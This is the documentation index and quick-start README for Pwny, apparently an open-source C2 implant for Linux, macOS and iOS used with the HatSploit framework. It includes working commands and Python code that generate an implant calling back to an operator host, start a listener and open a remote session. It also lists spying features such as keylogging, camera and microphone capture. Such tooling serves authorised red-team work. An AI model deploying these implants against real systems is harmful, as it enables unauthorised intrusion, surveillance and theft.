# Pwny Documentation

> *Friendly like a Pony, Mighty like a Knight*

Pwny is an advanced implant written in pure C, designed for portability and extensibility. It supports **Linux**, **macOS**, and **iOS** targets, and integrates tightly with the [HatSploit Framework](https://github.com/EntySec/HatSploit).

---

## Documentation Index

### General (All Platforms)

| Document | Description |
|----------|-------------|
| [Getting Started](getting-started.md) | Installation, deployment, and first session |
| [HTTPS & TLS Pinning](getting-started.md#https-with-tls-pinning) | HTTPS transport with SPKI public key pinning |
| [Certificate Hive](getting-started.md#workflow-c-certificate-hive) | Named certificate store for simplified HTTPS workflows |
| [CLI Reference](getting-started.md#command-line-interface) | `pwny` command — listen, generate, templates, check, cert |
| [Console](console.md) | Interactive console features, environment, prompt customization |
| [Commands Reference](commands.md) | All cross-platform commands with usage and example output |
| [Plugin Development](plugin-development.md) | Writing, building, and loading custom plugins (TABs) |
| [Building](building.md) | Compiling Pwny from source — dependencies, toolchains, CMake |

### Platform-Specific

| Platform | Document |
|----------|----------|
| Linux | [docs/linux/](linux/) — Linux commands, migration, camera, microphone |
| macOS | [docs/macos/](macos/) — macOS commands, keylogging, screen capture, clipboard |
| iOS | [docs/ios/](ios/) — iOS commands, device info, location, SpringBoard |

---

## Quick Start

```bash
# Install via HatSploit (recommended)
pip3 install git+https://github.com/EntySec/HatSploit

# Or standalone
pip3 install git+https://github.com/EntySec/Pwny
```

Generate a payload, start a listener, and catch a session:

**Using the CLI:**

```bash
# Generate implant
pwny generate x86_64-linux-musl -u tcp://192.168.1.10:8888 -o implant

# Start listener
pwny listen 0.0.0.0 8888 -p linux -a x64 -s
```

**HTTPS with TLS pinning:**

```bash
# Start HTTPS listener (prints the TLS pin)
pwny listen 0.0.0.0 443 -t https -p linux -a x64 -s

# Generate implant with the pin baked in
pwny generate x86_64-linux-musl \
    -u https://10.0.0.1:443/callback \
    --pin sha256//3I3sjY/H6JojhKCDyhD81ssivckp3QPRcHtp98nQJqA= \
    -o implant
```

**Using the Python API:**

```python
from pwny import Pwny
from pwny.session import PwnySession

# Generate implant binary
pwny = Pwny(
    target='x86_64-linux-musl',
    options={'uri': 'tcp://192.168.1.10:8888'}
)
with open('implant', 'wb') as f:
    f.write(pwny.to_binary())
```

```python
# Standalone TCP listener (examples/tcp_server.py)
import socket
from pwny.session import PwnySession

s = socket.socket()
s.bind(('0.0.0.0', 8888))
s.listen()
conn, addr = s.accept()

session = PwnySession()
session.info['Platform'] = 'linux'
session.info['Arch'] = 'x64'
session.open(conn)
session.interact()
```

Once connected, you'll see system information and the interactive prompt:

```
  Name: Ubuntu 22.04
  Kernel: 5.15.0
  Arch: x86_64
  Memory: 4.2 GB/16.0 GB
  Commands: 34
  Plugins: 0

pwny:/home/target$ 
```

---

## Architecture

```
┌────────────────────────────────────────────────────────┐
│                    Operator Machine                     │
│                                                        │
│  HatSploit / Standalone Listener                       │
│  ┌──────────────────────────────────────────────────┐  │
│  │  PwnySession                                     │  │
│  │  ├── Console (Cmd)  ← commands, plugins, prompt  │  │
│  │  ├── Pipes          ← bidirectional streaming    │  │
│  │  ├── Plugins        ← TAB loader                 │  │
│  │  ├── TLV channel    ← encrypted binary protocol  │  │
│  │  └── Loot           ← collected artifacts        │  │
│  └──────────────────────────────────────────────────┘  │
└───────────────────────┬────────────────────────────────┘
                        │ TCP / HTTP / TLS
┌───────────────────────▼────────────────────────────────┐
│                    Target Machine                       │
│                                                        │
│  Pwny Implant (C)                                      │
│  ├── Core         ← event loop, TLV dispatch           │
│  ├── C2           ← TCP/HTTP client, reconnect logic   │
│  ├── Builtins     ← sysinfo, fs, process, network      │
│  ├── Crypto       ← AES-256-CBC / ChaCha20             │
│  └── TABs         ← dynamically loaded plugins         │
│      └── ELF / Mach-O executables (pipe IPC)          │
└────────────────────────────────────────────────
```

---

## Supported Platforms

| Platform | Architectures | Plugin Loading |
|----------|--------------|----------------|
| Linux | x64, aarch64, armv5, i486, mips, mipsel, mips64, ppc, ppc64le, s390x | Pipe IPC (static-pie executables) |
| macOS | x86_64, aarch64 | Bundle / shared library |
| iOS | arm, aarch64 | Bundle |

---

## License

Pwny is released under the [MIT License](../LICENSE).

Copyright (c) 2020-2026 [EntySec](https://entysec.com)
